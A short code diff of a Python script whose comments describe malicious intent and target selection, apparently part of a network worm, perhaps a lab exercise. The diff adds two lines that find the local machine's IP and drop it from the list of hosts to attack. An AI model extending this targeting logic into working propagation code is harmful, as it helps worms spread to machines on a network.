@@ -193,7 +193,7 @@ if len(sys.argv) < 2:
     # Otherwise, proceed with malice.
     passi
 # TODO: Get the IP of the current system
-
+my_IP = getMyIP()
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
@@ -201,7 +201,7 @@ networkHosts = getHostsOnTheSameNetwork()
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
 # do not want to target ourselves!).
-
+networkHosts.remove(my_IP)
 print("Found hosts: ", networkHosts)
 
 
